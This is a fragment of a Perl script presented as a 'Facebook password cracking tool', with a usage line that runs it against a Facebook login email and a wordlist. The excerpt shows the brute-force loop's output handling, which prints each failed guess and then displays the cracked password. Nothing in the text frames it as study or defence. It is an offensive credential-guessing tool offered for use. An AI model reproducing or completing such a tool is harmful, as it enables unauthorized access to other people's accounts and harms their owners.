...
#
# Demo:
# perl brute.pl Facebooklogin@facebook.com wordlist.lst
#
# --- gross facebook password cracking tool
# --- By Imad'Ox Hunter
...
if (!defined $success)
{
print "[x] $password -> Fallo :( \n";
close SSL;
}
else
{
print "\n_________________________________________________________\n";
print " |[+] Contraseña => Pass is $password :D\n       |"; 
print "  ---------------------------------------------------------\n\n";
close SSL;
exit;
}
